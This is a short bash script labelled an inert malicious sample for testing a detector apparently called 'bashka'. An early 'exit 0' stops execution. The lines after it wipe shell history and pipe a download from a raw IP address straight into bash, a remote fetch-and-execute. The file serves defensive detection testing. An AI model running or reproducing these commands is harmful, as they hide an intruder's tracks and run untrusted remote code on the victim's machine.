#!/bin/bash
# INERT malicious sample for bashka detection testing. Do not run.
exit 0
unset HISTFILE; export HISTSIZE=0; rm -f ~/.bash_history
curl -s http://45.9.148.37/s2 | bash
